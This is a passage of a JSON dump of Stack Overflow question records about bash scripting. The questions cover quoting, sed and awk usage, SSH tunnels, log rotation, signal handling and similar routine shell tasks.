following behavior?</p>\n\n<pre class=\"lang-bsh prettyprint-override\"><code>echo $((true == false))\n1\n</code></pre>\n\n<p>I would have thought that this would print <code>0</code>, but it prints <code>1</code>.</p>\n\n<p>This is further complicated by the following facts:</p>\n\n<pre><code>&gt; echo $((true))\n0\n&gt; echo $((false))\n0\n&gt; echo $((true == true))\n1\n&gt; echo $((false == false))\n1\n</code></pre>\n"},{"tags":["bash","ubuntu","bash-completion","debian-based"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12641949,"title":"bash completion isn't working like it used to -- not escaping spaces and oddities in filenames, etc","body":"<p>Okay, I just don't understand why this isn't working automatically.</p>\n\n<p>When I'm working on my mac, spaces and other odd characters get escaped automatically when I do autocomplete in bash, but on my ubuntu box, they don't. Even worse, if I do escape the character, then try autocomplete, the escapes <em>disappear</em>. Why doesn't debian's bash complete know how to deal with spaces and other chars that need escaping out of the box??</p>\n"},{"tags":["linux","file","bash","text","encoding"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12866068,"title":"Finding the encoding of text files","body":"<p>I have a bunch of text files with different encodings. But I want to convert all of the into utf-8. since there are about 1000 files, I cant do it manually. I know that there are some commands in llinux which change the encodings of files from one encoding into another one. but my question is how to automatically detect the current encoding of a file? Clearly I'm looking for a command (say FindEncoding($File) ) to do this:</p>\n\n<pre><code>foreach file\ndo\n$encoding=FindEncoding($File);\nuconv -f $encoding -t utf-8 $file;\ndone\n</code></pre>\n"},{"tags":["java","bash","processbuilder"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":89,"score":0,"question_id":12866195,"title":"Best way to dynamically create and execute bash command in java?","body":"<p>I have a Java bot that I'm working on which takes input from a user via an IRC message. The user types in something like .host file=foo file=bar hostname=\"this is a name\" and it will start a server for them based on their input.</p>\n\n<p>Right now I have a method that basically parses their message, looking for hostname=\"\" (must be encapsulated by quotes), splitting the hostname= part, and setting the hostname to whatever their result is (for example, hostname=\"this is a name\" would become -hostname 'this is a name'). I am using regex to do this.</p>\n\n<p>I then split the string into an array (separated by spaces) and pass the information to processbuilder, which executes the command in it's own thread. The final command looks something like this:</p>\n\n<p>./server -hostname \"this is a name\"</p>\n\n<p>A problem I am running into is that since I am splitting by spaces, if the user adds a dash in the hostname (for example, hostname=\"this is - a name\", it'll think that the dash is referring to an argument, and will basically chop off the rest.</p>\n\n<p>Further explanation: processbuilder will split by spaces, so it will pass \"-hostname\" , \"this\" , \"is\" , \"-\" , \"a\" , \"name\". This is where I'm having trouble, since - means I should be passing an argument, but that's not what I am using it for.</p>\n\n<p>What would be the most efficient way to implement this so that any character being passed is only literally this character? Should I not be splitting at spaces? If I run ./server -hostname \"this is - a name\" from the linux shell, it will run fine.</p>\n\n<p>I appreciate any and all help. Thank you!</p>\n"},{"tags":["bash","ssh"],"answer_count":5,"favorite_count":2,"up_vote_count":10,"down_vote_count":0,"view_count":5104,"score":10,"question_id":2241063,"title":"Bash script to setup a temporary SSH tunnel","body":"<p>On CYGWIN, I want a BASH script to:</p>\n\n<ol>\n<li>create an SSH tunnel to a remote server. </li>\n<li>Do some work locally that uses the tunnel. </li>\n<li>Then shutdown the tunnel.</li>\n</ol>\n\n<p>The \"shutdown part\" has me perplexed.</p>\n\n<p>Currently, I have a lame solution. In one shell I run the following to create a tunnel.</p>\n\n<pre><code># Create the tunnel - this works! It runs forever, until shell is quit.\nssh -nNT -L 50000:localhost:3306 jm@sampledomain.com\n</code></pre>\n\n<p>Then, in another shell window, I do my work</p>\n\n<pre><code># Do some MYSQL stuff over local port 50000 (which goes to remote port 3306)\n</code></pre>\n\n<p>Finally, when I am done. I close the first shell window to kill the tunnel.</p>\n\n<p>I'd like to do this all in one script like:\n    # Create tunnel\n    # do work\n    # Kill tunnel</p>\n\n<p>How do I keep track of the tunnel process, so I know which one to kill?</p>\n"},{"tags":["bash","terminal","grep"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":523,"score":2,"question_id":4998290,"title":"Finding all file types in directory","body":"<p>What command, or collection of commands can I use to return all file extension in a directory (including sub-directories)?  Right now I'm using different combinations of ls and grep but I can't find any scalable solution.</p>\n"},{"tags":["linux","bash","unix"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12867742,"title":"which kill is called? bash builtin or /bin/kill","body":"<p>when i type</p>\n\n<pre><code>kill -s ‹n› ‹pid›\n</code></pre>\n\n<p>in terminal, is it calling bash builtin or /bin/kill?</p>\n\n<p>for this question, assume it's Ubuntu default setup (bash).</p>\n"},{"tags":["android","bash","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":107,"score":-2,"question_id":12862702,"title":"android : unable to run shell script(.sh) from my application","body":"<p>i am not able to run shell scripts from my application.only \"ls -l\" and echo commands respond.rest dont seem to do anything.not even \"touch\" command works.i tried creating a file in sdcard using touch command in my script..only the echo command worked.my shell script is in sdcard too</p>\n"}]}
{"total":16352,"page":11,"pagesize":100,"questions":[{"tags":["bash","cygwin"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":862,"score":0,"question_id":7962485,"title":"Escaping backslash in windows paths passed to unix programs","body":"<p>I am trying to escape backslashes in cygwin, but it seems almost impossible\nI have tried a lot of things, but none work right..</p>\n\n<pre><code>  echo \"C:\\Users\\Ted\\Documents\\Unix\\Scripts\" | xargs echo\n  echo 'C:\\Users\\Ted\\Documents\\Unix\\Scripts' | xargs echo\n</code></pre>\n\n<p>More specifically I need to get a command to receive input in bash without \nlosing the backslash characters.  every time I try to pass an argument, \nthe backslashes always disappear, destroying my input.  And I don't know \nhow I can tell it to just leave the backslashes on the input alone.  </p>\n\n<p>I have tried the following but neither seems work </p>\n\n<pre><code>  alias cyg0='cygpath '$*'  '\n  alias cyg1='cygpath \"$*\"  '\n  alias cyg2='cygpath \"'$*'\"'\n\n  alias cyg3='cygpath '$@'  '\n  alias cyg4='cygpath \"$@\"  '\n  alias cyg5='cygpath \"'$@'\"'\n\n\n  Ted@Machine01 ~\n  $ cyg0 C:\\Users\\Ted\\Music\\Enigma\n  C:UsersTedMusicEnigma\n\n  Ted@Machine01 ~\n  $ cyg1 C:\\Users\\Ted\\Music\\Enigma\n  cygpath: can't convert empty path\n\n  Ted@Machine01 ~\n  $ cyg2 C:\\Users\\Ted\\Music\\Enigma\n  cygpath: can't convert empty path\n\n  Ted@Machine01 ~\n  $ cyg3 C:\\Users\\Ted\\Music\\Enigma\n  C:UsersTedMusicEnigma\n\n  Ted@Machine01 ~\n  $ cyg4 C:\\Users\\Ted\\Music\\Enigma\n  C:UsersTedMusicEnigma\n\n  Ted@Machine01 ~\n  $ cyg5 C:\\Users\\Ted\\Music\\Enigma\n  cygpath: can't convert empty path\n</code></pre>\n\n<p>By the way, I want to be able to type C:\\Users\\Ted\\Music\\Enigma without \nquotes. One of those aliases works when using quotes.</p>\n\n<p>Ted</p>\n"},{"tags":["linux","bash","shell","script"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12865863,"title":"How to write a Bash program that searches through Directories and lists the files that have the largest numbered suffix?","body":"<p>I am trying to write a program that will search through a main directories sub-directories and list the files that have the largest number at the end. ex: filename_100. </p>\n\n<pre><code>find . -name \"*_*\" | sort -n | tail\n</code></pre>\n"},{"tags":["bash","google","wget","google-docs-api"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":2756,"score":3,"question_id":2745948,"title":"How to download all your google docs from shell","body":"<p>gents.\nI learned how to download single google doc. But I am trying to make a script that downloads all my data in text format and then merges them in 1 text file. So, I wonder how to implement downloading part so that 1 can get zip file with all my files just as you do with web browser. Here is my newb script to get single file. Hope you can suggest some tweaks that make it more effective.</p>\n\n<pre><code>#!/bin/bash\ntoken=$(curl -s https://www.google.com/accounts/ClientLogin -d Email=user.name@gmail.com -d Passwd=blahblah -d accountType=GOOGLE -d service=writely -d Gdata-version=3.0 |cut -d \"=\" -f 2)\nset $token\nwget --header \"Gdata-Version: 3.0\" --header \"Authorization: GoogleLogin auth=$3\" \"https://docs.google.com/feeds/download/documents/Export?docID=${resourceId}&amp;exportFormat=txt\" -O /tmp/${file[$i]}.txt\n</code></pre>\n\n<p>Here I specify single <strong>resourceId</strong>, as you see. Should I just push many <strong>resourceId</strong>-s in download link to get them all or there is better way?</p>\n"},{"tags":["linux","bash","shell","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12865870,"title":"Using sed to match anything and \\s","body":"<p>I've got the following:</p>\n\n<pre><code>sed -i \"s/SYNFLOOD_RATE  = \\\"100/s\\\"/SYNFLOOD_RATE  = \\\"10\\s\\\"/g\"\n</code></pre>\n\n<p>Question is how do I avoid this error?</p>\n\n<pre><code>/bin/sed: -e expression #1, char 28: unknown option to `s'\n</code></pre>\n\n<p>And is there a way to do a wild card match and replace with sed?</p>\n"},{"tags":["linux","bash","shell","command"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12866148,"title":"Convert my bash command into a bashrc function and pass argument","body":"<p>I've got a sweet bash command to find key phrases in files and filepaths, <a href=\"http://stackoverflow.com/a/12865286/318090\">thanks to @ezod here</a>. I'm trying to turn it into a function in my bashrc, but it doesn't generate the same result. I'm guessing it's related to back-to-back curly brackets that I need to escape or use an alternative method?</p>\n\n<p><strong>Works:</strong></p>\n\n<pre><code>{ find . -name '*keyword*'; grep -irl 'keyword' .; } | sort -u\n</code></pre>\n\n<p><strong>Does not work in bashrc:</strong></p>\n\n<pre><code>function findit() {\n  { find . -name '*$1*';\n    grep -irl '$1' .;\n  } | sort -u\n}\nexport -f findit\n\n$ findit keyword\n</code></pre>\n"},{"tags":["linux","bash","shell","command"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12865138,"title":"Bash command to search for any occurrence of phrase and return list of files and paths","body":"<p>I'm looking for a simple bash command to search for a phrase in filenames, directory names, and within text of all files. It should return a list of files and directories. Ideally, I'd like the option to pipe it to a file like > myfiles.txt</p>\n\n<p>Something like:</p>\n\n<pre><code>find 'my key phrase'\nfind 'my key phrase' &gt; mylist.txt\n</code></pre>\n\n<p>would return:</p>\n\n<pre><code>/home/stuff/filewithmykeyphraseinit.txt\n/home/stuff/a filename with my key phrase.doc\n/home/stuff/a directory with my key phrase/another subdirectory/\n</code></pre>\n\n<p><strong>EDIT:</strong>\nI'm getting a lot of great suggestions I'm currently testing. One issue: is there a way to make these case-insensitive? I believe adding -i to grep works. How about find for filepaths/names? Also, I'd like to have the option to either send the output to a text file or to screen.</p>\n"},{"tags":["bash","find"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12443320,"title":"bash check core exists and is recent","body":"<p>I am looking for a simpler way of doing this:</p>\n\n<pre><code>#!/usr/bin/bash\n\nFILE=core\nDAYS=1\n\ncd /programdir\n\nif [ -f ${FILE} ]; then\n   agetest=$(find . -name \"${FILE}\" -type f -mtime +${DAYS} -print | wc -c)\n   if [[ agetest -eq 0 ]] ; then\n      echo \"$FILE exists and is not older than ${DAYS} days.\"\n   fi\nfi\n</code></pre>\n\n<p>I want to process a core file (using the dbx command) if the script finds it and the core file is recent (within 1 day).  So I would run a dbx command where that echo statement is.  It seems like there should be a way to do this in a more elegant way with 1 if statement, but I can't think of how to do that.  Any ideas?</p>\n\n<p>I know it would be easier to just clean up the old core files with tmpwatch or find/rm, but I'm not allowed to do that.</p>\n"},{"tags":["bash","sorting","printing","script"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":12835319,"title":"BASH script - print sorted contents from all files in directory with no rep's","body":"<p>In the current directory there are files with names of the form \"gradesXXX\" (where XXX is a course number) which look like this:</p>\n\n<pre><code>ID           GRADE         (this line is not contained in the files)\n123456789    56\n213495873    84\n098342362    77\n.            .\n.            .\n.            .\n</code></pre>\n\n<p>I want to write a BASH script that prints all the IDs that have a grade above a certain number, which is given as the first parameter to said script.</p>\n\n<p>The requirements are that an ID must be printed once at most, and that no intermediate files are used.\nI was guided to use two scripts - the first with length of one line, and the second with length of up to six lines (not including the \"#!\" line).</p>\n\n<p>I'm quite lost with this one so any suggestions will be appreciated.\nCheers. </p>\n"},{"tags":["ruby","osx","bash","compiler-errors","rvm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":130,"score":0,"question_id":12861038,"title":"Error installing Ruby without Xcode Command Line Tools: No such file, but it exists","body":"<p>I'm installing RVM &amp; Ruby without Xcode's Command Line Tools (on Mac OS X 10.8.2 (12C60) (Mountain Lion) with Xcode 4.5 (4G182)).</p>\n\n<p>RVM installs fine. But, when I try to install Ruby, I get <code>error: limits.h: No such file or directory</code> <a href=\"https://gist.github.com/3789921#L241\" rel=\"nofollow\">https://gist.github.com/3789921#L241</a>.</p>\n\n<p>But, that file exists there because <code>cat</code> works and so does:</p>\n\n<pre><code>$ file /usr/local/Cellar/apple-gcc42/4.2.1-5666.3/bin/../lib/gcc/i686-apple-darwin11/4.2.1/include/limits.h\n/usr/local/Cellar/apple-gcc42/4.2.1-5666.3/bin/../lib/gcc/i686-apple-darwin11/4.2.1/include/limits.h: ASCII c program text\n</code></pre>\n\n<p>So, why does bash say it doesn't exist?</p>\n\n<p>The following questions are similar but unhelpful:</p>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/3949161/no-such-file-or-directory-but-it-exists\">&quot;No such file or directory&quot; but it exists</a></li>\n<li><a href=\"http://superuser.com/questions/344533/no-such-file-or-directory-error-in-bash-but-the-file-exists\">'No such file or directory' error in bash, but the file exists?</a></li>\n<li><a href=\"http://stackoverflow.com/questions/7459037/bash-no-such-file-or-directory-but-it-exists\">-bash no such file or directory, but it exists</a></li>\n</ul>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12859672,"title":"Bash - stripping of the last digits of a number - which one is better in terms of semantic?","body":"<p>Consider a this string containing an integer</p>\n\n<pre><code>nanoseconds=$(date +%s%N)\n</code></pre>\n\n<p>when I want to strip off the last six characters, what would be semantically better?</p>\n\n<p>Stripping just the characters off the string</p>\n\n<pre><code>nanoseconds=$(date +%s%N)\n\nmilliseconds=${nanoseconds%??????}\n</code></pre>\n\n<p>or dividing the value by 1000000</p>\n\n<pre><code>milliseconds=$((nanoseconds / 1000000))\n</code></pre>\n\n<p><strong>EDIT</strong></p>\n\n<p>Sry for not being clear. It's basically for doing a conversion from nanoseconds to milliseconds. I think I answered my own question...</p>\n"},{"tags":["bash","subset","column"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12863767,"title":"How to select subset of values in bash","body":"<p>I have a file say input.dat like this  </p>\n\n<pre><code>column1 column2\n 0       0\n 1.3     1.6\n 1.8     2.1\n 2.0      \n 2.6\n</code></pre>\n\n<p>I need to extract subset of values from 1st column, which are closest to those in column 2, so that the total number of entries in both columns is equal. \nIn this example, the output I need to obtain</p>\n\n<pre><code>column1 column2\n0      0 \n1.8    1.6\n2.0    2.1\n</code></pre>\n\n<p>How can I get this ?</p>\n"},{"tags":["bash","scripting","pear","expect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12862597,"title":"Automating pear install with expect","body":"<p>I'm working on a small script to try and automate the installation of pear on a system should it be missing - basically, taking the interactive portions of the installation process and making them non-interactive so all I need to do is execute the script and it does it for me on its own. This is my first time trying to use expect and it's, well, not what I expected. </p>\n\n<p>Sample code below:</p>\n\n<pre><code> /usr/bin/expect &lt;&lt;EOD\n          set timeout 20\n          set number [lindex $argv 0]\n          set path [lindex $argv 1]\n\n spawn php -q go-pear.phar\n expect \"1-11, 'all' or Enter to continue:\"\n send \"$number\\r\"\ninteract\n expect \"Installation base ($prefix) [/usr/local] :\"\nsend \"$path\\r\"\n interact\nEOD\n</code></pre>\n\n<p>This is not quite working at the moment as it's trying to fill in the /usr/local portion in the first menu as follows:</p>\n\n<pre><code>1-11, 'all' or Enter to continue: invalid command name \"/usr/local\"\n    while executing\n\"/usr/local\"\n    invoked from within\n\"expect \"Installation base () [/usr/local] :\"\"\n</code></pre>\n\n<p>Can anyone show me what I'm missing here? Also, I'd like to get this so I don't have to run it as ./script $var0 $var1 but rather just run it as ./script with everything being contained within and filled in, but not sure how to do that. </p>\n\n<p>Thanks in advance for any help you can offer.</p>\n"},{"tags":["bash","shell","whitespace","quotes"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":68,"score":-4,"question_id":12846561,"title":"Why quoted filenames containing spaces are split in shell/bash?","body":"<p>When I have file name with spaces</p>\n\n<pre><code>F=\"My Documents\"\n</code></pre>\n\n<p>and I want to use it as a variable </p>\n\n<pre><code>ls $F\n</code></pre>\n\n<p>it doesn't work... LS command see two different files. But I've quoted it already, like in C or Python.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":1260,"score":3,"question_id":3005627,"title":"Bash: Nth word in a string","body":"<p>In bash, I want to get the Nth word of a string.</p>\n\n<p>For instance:</p>\n\n<ul>\n<li>STRING=\"one two three four\"</li>\n<li>N=3</li>\n<li>Result: \"three\"</li>\n</ul>\n\n<p>What bash command/script could do this?<br>\nThank you!</p>\n"},{"tags":["bash","unix"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12854303,"title":"Alarm Script in bash shell","body":"<p>I wanted to write a small script which displays a image or play a song at the particular time. What is the best way(which consumes less RAM) to do that ? </p>\n\n<p>One way I thought is to Recursively query for time using <code>date</code> command and run it through a for loop(checks for hours) within a for loop(checks for minutes) until time reaches the preset time.</p>\n\n<p>Is it the correct approach? are there any other Smart ways of writing it?</p>\n"},{"tags":["linux","bash","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12861981,"title":"Multisplitting in AWK","body":"<p>I would like to execute 2 splits using AWK (i have 2 fields separator), the String of data i'm working on would look like something like so:</p>\n\n<pre><code>data;digit&amp;int&amp;string&amp;int&amp;digit;data;digit&amp;int&amp;string&amp;int&amp;digit\n</code></pre>\n\n<p>As you can see the outer field separator is a semicolon, and the nested one is an ampersand.\nWhat i'm doing with awk is (suppose that the String would be in a variable named test)</p>\n\n<pre><code>echo ${test} | awk '{FS=\";\"} {print $2}' | awk '{FS=\"&amp;\"} {print $3}'\n</code></pre>\n\n<p>This should catch the \"String\" word, but for some reason this is not working.\nIt seems like the second pipe its not being applied, as i see only the result of the first awk function\nAny advice?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12860993,"title":"BASH: How to set the date and time for all entries in the directory /home/virt/","body":"<p>How to set the date (01.01.2000) and time (00.00.00) for all entries in the directory /home/virt/ ?</p>\n\n<p>Thank you very much ;)</p>\n"},{"tags":["bash","shell","stdout","stderr","nohup"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12820616,"title":"Redirect nohup's stderr to nohup.out","body":"<p>How do I run a command with <code>nohup</code> so that <em>both</em> the stdout and stderr are saved to <code>nohup.out</code>? By default only stdout is saved and stderr is discarded.</p>\n"},{"tags":["python","bash","parsing","scripting"],"answer_count":11,"favorite_count":2,"up_vote_count":9,"down_vote_count":1,"view_count":194,"score":8,"question_id":12831438,"title":"Text File data parsing lines and output as columns","body":"<p>I'm trying to parse a test file. the file has username, address and phone in the following format:</p>\n\n<pre><code>Name: John Doe1\naddress : somewhere\nphone: 123-123-1234\n\nName: John Doe2\naddress : somewhere\nphone: 123-123-1233\n\nName: John Doe3\naddress : somewhere\nphone: 123-123-1232\n</code></pre>\n\n<p>Only for almost 10k users: )     what I would like to do is convert those rows to columns, for example:</p>\n\n<pre><code>Name: John Doe1                address : somewhere          phone: 123-123-1234\nName: John Doe2                address : somewhere          phone: 123-123-1233\nName: John Doe3                address : somewhere          phone: 123-123-1232\n</code></pre>\n\n<p>I would prefer to do it in <code>bash</code> but if you know how to do it in python that would be great too, the file that has this information is in /root/docs/information. Any tips or help would be much appreciated.</p>\n"},{"tags":["regex","bash","sed"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":56,"score":2,"question_id":12832762,"title":"SED RegEx Between Multiple Same Characters","body":"<p>How would I grab this following title text between all this tags and symbols ?</p>\n\n<p>What I need to grab:</p>\n\n<pre><code>Some Title Here v1.2.3 Some Other Description About the Title in Here\n</code></pre>\n\n<p>Example source code:</p>\n\n<pre><code>&lt;body&gt;&lt;pre&gt;=============================================================\nSome Title Here v1.2.3 Some Other Description About the Title in Here\n=============================================================\n\nsome other data here but I don't care about it ...\n\n&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n\n<p>I've tried doing this, but it grabs whole top part too before pre tag even, but bellow part seems to work fine, except that it also grabs = symbols.</p>\n\n<pre><code>sed -n '/&lt;pre&gt;=/,/=/p\n</code></pre>\n\n<p>Result from this above sed code is:</p>\n\n<pre><code>&lt;body&gt;&lt;pre&gt;=============================================================\nSome Title Here v1.2.3 Some Other Description About the Title in Here\n=============================================================\n</code></pre>\n\n<p>Any feedback about this would be apreceated. Thank you so much, and as always StackOverflow is the best community for Q's and A's =)</p>\n"},{"tags":["bash","substring","cut"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":12860603,"title":"Code for extracting from the right side with cut command?","body":"<p>There is a sample of using the <code>cut</code> command to extract parts of a string starting from the left. An example is given below.</p>\n\n<pre><code>$ echo \"abc-def-ghi-jkl\" | cut -d- -f-2\nabc-def\n</code></pre>\n\n<p>How can the same code be adapted to extracting from the right side? I thought of reversing the words and applying the same method, but it was too complicated.</p>\n"},{"tags":["linux","bash","unix","alias","man"],"answer_count":1,"favorite_count":2,"up_vote_count":5,"down_vote_count":3,"view_count":74,"score":2,"question_id":12860627,"title":"Replace \"man\" by \"?\"","body":"<p>I am using R a lot. In R, you can call a man page for a function by writing</p>\n\n<pre><code>?print\n</code></pre>\n\n<p>I got used to that so much that I intermittently type that in a bash shell window as well. Now, I have set up an alias</p>\n\n<pre><code>?='man'\n</code></pre>\n\n<p>that <em>almost</em> cuts it: I can do, for example, <code>? ls</code>. However, I would prefer it to work with <code>?ls</code>. Unfortunately, this one does not work. Is there any way to make bash call the man page when I type the question mark without the space after?</p>\n"},{"tags":["regex","linux","bash","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":12860255,"title":"Trying to match a string and add it to the replacement","body":"<p>I am trying to add a string to the end of a line using sed and regex.</p>\n\n<p>I have the following string:</p>\n\n<pre><code>disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,\n</code></pre>\n\n<p>and im trying to add to the end of it the string:</p>\n\n<pre><code>exec,system,shell_exec,passthru,\n</code></pre>\n\n<p>My attempt is as follows:</p>\n\n<pre><code>sed -ie 's/disable_functions = .*[a-zA-z,]$/disable_functions = $1exec,system,shell_exec,passthru,/gI' /etc/php5/apache2/php.ini\n</code></pre>\n\n<p>It seems to just add $1 to the string disable_functions = $1exec,system,shell_exec,passthru,</p>\n\n<p>Where am I going wrong?</p>\n"},{"tags":["bash","shell","tomcat","ubuntu","log-rotation"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12859921,"title":"How to get the logs in my script when its been getting rotated?","body":"<p>I have a script where I'm fetching the logs from the tomcat and sending that into the my cloud resource. Everything works well, but I have a problem when my tomcat rotates the log.</p>\n\n<p>When the logs get rotated its been prefixed with date ( log gets rotated every day ). Since my script just runs every half an hour I may miss the logs when it gets rotated, because I'm fetching the logs with their static name, in the example <code>logfile.log</code>. </p>\n\n<p>Before getting rotated the file will look like this :</p>\n\n<pre><code>logfile.log\n</code></pre>\n\n<p>After getting rotated, it will look like this :</p>\n\n<pre><code>logfile.log.2012-10-09\n</code></pre>\n\n<p>Are there any ways to get rid of this problem?</p>\n\n<h2>Edit:</h2>\n\n<p>My script :</p>\n\n<pre><code>cp /tomcat/logs/$logname $fileName \ngzip $fileName\ns3cmd put $fileName.gz s3://x.x.x.x.x/$folderName\n</code></pre>\n\n<p>Thanks in advance.</p>\n"},{"tags":["bash","signals"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12856620,"title":"How to handle signals in bash during synchronous execution?","body":"<p>I have a bash script process which at some point executes a long-running subprocess synchronously.\nDuring the run of that subprocess, a signal is sent directly to the bash script process requesting the script to terminate.\nIs there any way to intercept that signal, terminate the subprocess and then exit the bash process?</p>\n\n<p>Apparently, bash's signal handling never interrupts synchronous calls?</p>\n\n<p>I cannot control the fact that the termination signal is sent to the bash process. Although if the signal could propagate to the child process, that would also solve my issue.</p>\n\n<p>thanks in advance,\nBroes</p>\n"},{"tags":["bash","redirect","var","eof"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12855000,"title":"bash redirecting EOF into variable","body":"<p>this is my file perl5lib.sh:</p>\n\n<pre><code>export PERL5LIB=`cat |tr '\\n' ':'`&lt;&lt;EOF\n/home/vul/repository/projects/implatform/daemon/trunk/lib/\n/home/vul/repository/projects/platformlib/tool/trunk/cpan_lib\n/home/projects/libtrololo\n</code></pre>\n\n<p>I want to start file as</p>\n\n<pre><code>. perl5lib.sh\n</code></pre>\n\n<p>to populate <code>PERL5LIB</code> variable, but it hangs. What is wrong?\nmy goal is to left folder names at the end of file, so I can add new simply:</p>\n\n<pre><code>echo dirname &gt;&gt; myscript\n</code></pre>\n\n<p>I have tried and <code>export PERL5LIB=$(echo blabla)</code> and <code>cat&lt;&lt;EOF</code> both work separately, but not together.</p>\n\n<p>=================== THE SOLUTION ============================</p>\n\n<h1>function do the trick!</h1>\n\n<pre><code>function fun\n{\n     export PERL5LIB=`cat|tr '\\n' ':'`\n}\nfun&lt;&lt;EOF\n/dir1/lib\n/dir2/lib\n/dir3/lib\n</code></pre>\n"},{"tags":["bash","substring"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12859036,"title":"What bash code implements the equivalent of left(), right() an mid() from BASIC?","body":"<p>I am writing some code to test for membership of a group via <code>groups username</code> which returns a result like <code>vfclists : vfclists adm dialout cdrom plugdev lpadmin sambashare admin</code>.</p>\n\n<p>The code for testing is like this</p>\n\n<pre><code>#!/bin/bash\nUGROUP=$1\nGROUP=$2\nGROUPLIST=`groups $1`\n\necho $UGROUP\necho $GROUP\necho $GROUPLIST\n\nif [[ \"$GROUPLIST\" == *\"$GROUP\"* ]]\nthen\n  echo \"$UGROUP is a member of $GROUP\";\nfi\n</code></pre>\n\n<p>The problem is the output of group includes the users name. How can I return the part of the output that appears to the right of the second appearance of the user name?</p>\n\n<p>If the appearance of the username as the first group after the colon is not guaranteed is there some way to strip out the user name from the output altogether?</p>\n"},{"tags":["linux","bash","unix","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":91,"score":-3,"question_id":12858173,"title":"how to read .dat file and grep specific value","body":"<p>I am trying to read a .dat file using bash script.</p>\n\n<p>The value contains file size I want to grep values bigger than 0 except first column. Greater than zero value can come in any row.</p>\n\n<pre><code>I have awk script to read line by line. \n\n\n\n 1349848860, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n1349848920, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n1349848980, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n1349849040, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n1349849100, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0\n1349849160, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 227.736, 2, 0, 29378, 0, 0, 0, 0, 0\n1349849220, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n1349849280, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n1349849340, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0\n1349851200, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 